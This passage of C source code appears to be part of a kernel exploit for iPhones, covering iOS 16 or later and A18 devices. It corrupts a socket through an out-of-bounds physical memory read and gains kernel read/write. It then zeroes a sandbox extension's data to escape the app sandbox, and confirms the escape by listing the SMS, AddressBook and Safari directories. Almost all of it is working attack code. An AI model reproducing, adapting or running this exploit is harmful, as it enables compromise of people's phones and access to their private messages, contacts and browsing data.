				kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
				if (kr == KERN_SUCCESS) {
					if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, &targetInpGencntList, false) == KERN_SUCCESS) {
						success = true;
						break;
					}
				}
				seekingOffset += PAGE_SIZE;
			}
			kr = mach_port_deallocate(mach_task_self(), memoryObject);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_port_deallocate failed: kr=%d\n", kr);
				FAILURE(0);
			}
			if (success == true) {
				break;
			}
		}
		if (!success) sockets_release(&socketPorts);
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = u64_array_last(&searchMappings);
			u64_array_pop(&searchMappings);
			kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
		}
		u64_array_free(&searchMappings);
		if (isA18Device) {
			surface_munlock(wiredMapping, wiredMappingSize);
		}
		if (success == true) {
			break;
		}
	}
	u64_array_free(&targetInpGencntList);
}

void pe_v2(void)
{
	// TODO: Implement
}

void krw_sockets_leak_forever(void)
{
	printf("[i] krw: reading controlSocketAddr from %#llx\n", controlSocketPcb + OFFSET_PCB_SOCKET);
	uint64_t controlSocketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
	printf("[i] krw: controlSocketAddr = %#llx\n", controlSocketAddr);
	printf("[i] krw: reading rwSocketAddr from %#llx\n", rwSocketPcb + OFFSET_PCB_SOCKET);
	uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
	printf("[i] krw: rwSocketAddr = %#llx\n", rwSocketAddr);

	if (!controlSocketAddr || !rwSocketAddr ||
	    (controlSocketAddr >> 56) != 0xff || (rwSocketAddr >> 56) != 0xff) {
		printf("[-] Bad socket addrs: control=%#llx rw=%#llx\n", controlSocketAddr, rwSocketAddr);
		FAILURE(0);
	}

	printf("[i] krw: reading so_count from %#llx\n", controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
	uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
	printf("[i] krw: controlSocketSoCount = %#llx\n", controlSocketSoCount);
	printf("[i] krw: reading so_count from %#llx\n", rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
	uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
	early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);
	early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);

	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
}

uint64_t kernel_base;
uint64_t kernel_slide;

int main(int argc, char* argv[])
{
	init_globals();
	struct utsname name;
	uname(&name);

	isA18Device = (bool)strstr(name.machine, "iPhone17,");

	int os_major = 0;
	char *dot = strchr(name.release, '.');
	if (dot) {
		*dot = '\0';
		os_major = atoi(name.release);
		*dot = '.';
	}
	bool isIOS16OrLater = (os_major >= 22);

	if (isA18Device) {
		printf("[+] Running on A18 device\n");
		sleep(8);
		pe_init();
		pe_v2();
	}
	else {
		printf("[+] Running on non-A18 device\n");
		pe_init();
		pe_v1();
	}

	printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
	printf("[+] successReadCount: %d\n", successReadCount);

	goSync = 0;
	raceSync = 1;
	pthread_join(freeThread, NULL);
	close(writeFd);
	close(readFd);

	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);

	// sockets stay alive via port refs (no sockets_release on success path)
	// skip krw_sockets_leak_forever — not needed without release

	uint64_t socketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
	uint64_t ucred = early_kread64(socketAddr + OFFSET_SO_CRED);
	uint64_t cr_label = __xpaci(early_kread64(ucred + OFFSET_UCRED_LABEL));
	uint64_t sandbox = early_kread64(cr_label + OFFSET_LABEL_SANDBOX);
	printf("[i] socketAddr=%#llx ucred=%#llx cr_label=%#llx sandbox=%#llx\n",
		socketAddr, ucred, cr_label, sandbox); fflush(stdout);

	if (!sandbox) {
		printf("[+] no sandbox — already unsandboxed\n"); fflush(stdout);
	} else {
		// first, issue+consume an extension so there's one in the table
		char *tmppath = calloc(1, 1024);
		confstr(_CS_DARWIN_USER_TEMP_DIR, tmppath, 1024);
		char tmpname[64];
		snprintf(tmpname, 64, "/%u", arc4random());
		strcat(tmppath, tmpname);
		int tmpfd = open(tmppath, O_CREAT | O_RDWR, 0644);
		if (tmpfd >= 0) close(tmpfd);
		char *ext_token = sandbox_extension_issue_file("com.apple.app-sandbox.read-write", tmppath, 0);
		if (ext_token) {
			sandbox_extension_consume(ext_token);
			printf("[+] issued+consumed sandbox extension for %s\n", tmppath); fflush(stdout);
		} else {
			printf("[-] sandbox_extension_issue_file failed\n"); fflush(stdout);
		}

		uint64_t ext_set = early_kread64(sandbox + OFFSET_SANDBOX_EXTSET);
		printf("[i] ext_set=%#llx\n", ext_set); fflush(stdout);

		// ext_set is a hash table: ext_table[hash] -> extension_hdr linked list
		// hash=0 for read-write extensions
		uint64_t ext_hdr = early_kread64(ext_set + 0 * 8);
		printf("[i] ext_hdr=%#llx\n", ext_hdr); fflush(stdout);

		// walk to last ext_hdr in chain
		while (ext_hdr) {
			uint64_t next = early_kread64(ext_hdr + 0x00);
			if (!next) break;
			ext_hdr = next;
		}

		// ext_hdr + 0x8 -> ext_lst -> extension
		uint64_t ext = early_kread64(ext_hdr + 0x08);
		printf("[i] ext=%#llx\n", ext); fflush(stdout);

		if (ext) {
			uint64_t data = early_kread64(ext + OFFSET_EXT_DATA);
			uint64_t data_len = early_kread64(ext + OFFSET_EXT_DATA_LEN);
			printf("[i] data=%#llx data_len=%llu\n", data, (unsigned long long)data_len); fflush(stdout);

			if (data && data_len) {
				// zero data[0] and data_length to make extension match everything
				early_kwrite64(ext + OFFSET_EXT_DATA, 0);
				early_kwrite64(ext + OFFSET_EXT_DATA_LEN, 0);
				printf("[+] SANDBOX ESCAPED - zeroed extension data\n"); fflush(stdout);
			}
		}
	}

	printf("[*] verifying filesystem access...\n"); fflush(stdout);
	const char *test_dirs[] = {
		"/var/mobile/Library/SMS",
		"/var/mobile/Library/AddressBook",
		"/var/mobile/Library/Safari",
		NULL
	};
	for (int d = 0; test_dirs[d]; d++) {
		DIR *dir = opendir(test_dirs[d]);
		if (!dir) {
			printf("[-] opendir(%s): errno=%d\n", test_dirs[d], errno); fflush(stdout);
			continue;
		}
		printf("[+] opendir(%s): OK\n", test_dirs[d]); fflush(stdout);
		struct dirent *ent;
		int count = 0;
		while ((ent = readdir(dir)) && count < 5) {
			printf("    %s\n", ent->d_name);
			count++;
		}
		fflush(stdout);
		closedir(dir);
	}

	printf("[*] DONE — sleeping to keep sockets alive\n"); fflush(stdout);
	while (1) sleep(3600);
}